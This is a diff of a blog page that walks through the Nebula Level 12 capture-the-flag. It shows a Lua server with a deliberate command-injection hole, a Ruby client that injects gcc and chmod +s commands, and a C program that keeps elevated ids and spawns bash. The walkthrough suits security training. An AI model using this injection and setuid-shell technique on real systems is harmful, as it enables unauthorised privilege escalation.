@@ -10,11 +10,11 @@
   <title>Exploit Exercises - Nebula Level 12 &middot; jc han</title>
 
   
-  <link rel="stylesheet" href="/css/poole.css">
-  <link rel="stylesheet" href="/css/hyde.css">
-  <link rel="stylesheet" href="/css/poole-overrides.css">
-  <link rel="stylesheet" href="/css/hyde-overrides.css">
-  <link rel="stylesheet" href="/css/hyde-x.css">
+  <link rel="stylesheet" href="/hanjc.me/css/poole.css">
+  <link rel="stylesheet" href="/hanjc.me/css/hyde.css">
+  <link rel="stylesheet" href="/hanjc.me/css/poole-overrides.css">
+  <link rel="stylesheet" href="/hanjc.me/css/hyde-overrides.css">
+  <link rel="stylesheet" href="/hanjc.me/css/hyde-x.css">
   
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
   <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
@@ -42,7 +42,11 @@
     </div>
 
     <ul class="sidebar-nav">
-      <li class="sidebar-nav-item"><a href="/">Blog</a></li>
+      <li class="sidebar-nav-item"><a href="/hanjc.me/">Blog</a></li>
+      
+      <li class="sidebar-nav-item"><a href="/hanjc.me/post/">Archives</a></li>
+      
+      <li class="sidebar-nav-item"><a href="/hanjc.me/notes/">Notes</a></li>
       
     </ul>
 
@@ -57,7 +61,7 @@
       </li>
     </ul>
 
-    <p>Copyright &copy; 2015 <a href="/license">License</a><br/>
+    <p>Copyright &copy; 2015 <a href="/hanjc.me/license">License</a><br/>
        Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
   </div>
 </div>
@@ -66,11 +70,11 @@
 <div class="content container">
   <div class="post">
     <h1>Exploit Exercises - Nebula Level 12</h1>
-    <span class="post-date">Jan 26, 2014 &middot; 2 minute read &middot; <a href="/post/2014-01-26-nebula-level12/#disqus_thread">Comments</a>
+    <span class="post-date">Jan 26, 2014 &middot; 2 minute read &middot; <a href="/hanjc.me/post/2014-01-26-nebula-level12/#disqus_thread">Comments</a>
     
     <br/>
     
-    <a class="label" href="/categories/security">Security</a><a class="label" href="/categories/exercises">Exercises</a><a class="label" href="/categories/nebula">Nebula</a>
+    <a class="label" href="/hanjc.me/categories/security">Security</a><a class="label" href="/hanjc.me/categories/exercises">Exercises</a><a class="label" href="/hanjc.me/categories/nebula">Nebula</a>
     </span>
     
 
@@ -84,51 +88,49 @@
 
 <h3 id="source-code:4f2f3bde9982f1888f7baf64aff676f9">Source code</h3>
 
-<p>``` lua /home/flag12/flag12.lua
-local socketlocal socket = require(&ldquo;socket&rdquo;)
-local server = assert(socket.bind(&ldquo;127.0.0.1&rdquo;, 50001))</p>
+<pre><code class="language-lua">-- /home/flag12/flag12.lua 
+local socketlocal socket = require(&quot;socket&quot;)
+local server = assert(socket.bind(&quot;127.0.0.1&quot;, 50001))
 
-<p>function hash(password)
-  prog = io.popen(&ldquo;echo &ldquo;..password..&rdquo; | sha1sum&rdquo;, &ldquo;r&rdquo;)
-  data = prog:read(&rdquo;*all&rdquo;)
-  prog:close()</p>
+function hash(password) 
+  prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)
+  data = prog:read(&quot;*all&quot;)
+  prog:close()
 
-<p>data = string.sub(data, 1, 40)</p>
+  data = string.sub(data, 1, 40)
 
-<p>return data
-end</p>
+  return data
+end
 
-<p>while 1 do
+
+while 1 do
   local client = server:accept()
-  client:send(&ldquo;Password: &ldquo;)
+  client:send(&quot;Password: &quot;)
   client:settimeout(60)
   local line, err = client:receive()
   if not err then
-    print(&ldquo;trying &rdquo; .. line) &ndash; log from where ;\
-    local h = hash(line)</p>
+    print(&quot;trying &quot; .. line) -- log from where ;\
+    local h = hash(line)
 
-<pre><code>if h ~= &quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot; then
-  client:send(&quot;Better luck next time\n&quot;);
-else
-  client:send(&quot;Congrats, your token is 413**CARRIER LOST**\n&quot;)
+    if h ~= &quot;4754a4f4bd5787accd33de887b9250a0691dd198&quot; then
+      client:send(&quot;Better luck next time\n&quot;);
+    else
+      client:send(&quot;Congrats, your token is 413**CARRIER LOST**\n&quot;)
+    end
+
+  end
+
+  client:close()
 end
 </code></pre>
 
-<p>end</p>
+<h3 id="solution:4f2f3bde9982f1888f7baf64aff676f9">Solution</h3>
 
-<p>client:close()
-end</p>
+<p><code>prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)</code> this line of code in <em>hash()</em> function try to calc the hash of the password, but we can execute any command with a well structed <em>password</em>.</p>
 
-<pre><code>
+<p>Write a simple Ruby script to send command to server, here I construct a <em>password</em> to make the server build a <em>drop.c</em> file into directory /home/flag12.</p>
 
-### Solution 
-
-`prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)` this line of code in *hash()* function try to calc the hash of the password, but we can execute any command with a well structed *password*. 
-
-Write a simple Ruby script to send command to server, here I construct a *password* to make the server build a *drop.c* file into directory /home/flag12.
-
-``` ruby
-require 'socket'
+<pre><code class="language-ruby">require 'socket'
 
 server = TCPSocket.open(&quot;127.0.0.1&quot;, 50001)
 server.puts(&quot;hello &amp;&amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;&amp; chmod 777 /home/flag12/flag12 &amp;&amp; chmod +s /home/flag12/flag12 &amp;&amp; echo hello &quot;)
@@ -138,30 +140,29 @@ puts &quot;#{ret}&quot;
 
 <p>Remenber the piece of C code we used to drop privilege? Here it is again:</p>
 
-<p>``` c /tmp/drop.c
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/types.h>
-#include <stdio.h></p>
+<pre><code class="language-c">/* /tmp/drop.c */
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
 
-<p>int main() {
+int main() {
   gid_t gid;
   uid_t uid;
   gid = getegid();
-  uid = geteuid();</p>
+  uid = geteuid();
 
-<p>setresgid(gid, gid, gid);
-  setresuid(uid, uid, uid);</p>
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
 
-<p>execv(&ldquo;/bin/bash&rdquo;, NULL);
-}</p>
+  execv(&quot;/bin/bash&quot;, NULL);
+}
+</code></pre>
 
-<pre><code>
-Run the Ruby script, I got
+<p>Run the Ruby script, I got</p>
 
-``` bash
-level12@nebula:~$ ruby client.rb
+<pre><code class="language-bash">level12@nebula:~$ ruby client.rb
 Password: Better luck next time
 </code></pre>
 
